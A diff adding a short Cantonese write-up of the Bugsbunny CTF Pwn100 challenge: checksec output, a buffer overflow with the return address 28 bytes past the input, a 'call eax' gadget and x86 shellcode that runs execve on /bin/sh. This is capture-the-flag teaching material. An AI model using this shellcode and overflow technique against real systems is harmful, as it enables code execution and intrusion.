@@ -1,5 +1,10 @@
 # Bugsbunnyctf Pwn100
 
+呢題其實唔難,不過比賽個陣炒左shellcode, 睇返writeup原來要自己打shellcode ༼☯﹏☯༽
+
+checksec 
+
+冇NX冇canary
 
 ```
     Arch:     i386-32-little
@@ -8,6 +13,12 @@
     NX:       NX disabled
     PIE:      No PIE (0x8048000)
 ```
+
+有bufferoverflow vulnerability
+
+ret 係input+28之後
+
+input 係eax到
 
 ```
 ────────────────────────────────── Registers ───────────────────────────────────
@@ -28,10 +39,31 @@ Stopped reason: SIGSEGV
 gdb-peda$ 
 ````
 
-
+ROPgadget:
 
 ```
 0x08048386 : call eax
 ```
 
+
+shellcode:
+
+
+```x86
+xor eax,eax
+xor ecx,ecx
+xor edx,edx
+xor esi,esi
+mov eax,0x0b
+lea ebx,[esp-8]
+int 0x80
+/bin/sh\x00
+
+```
+
+Sad~~~~~
+
+# Reference
+
+1.http://sw1ss.team/bugs_bunny_ctf_2k17/2017/07/31/bugs_bunny_ctf_2k17-pwn100/
 
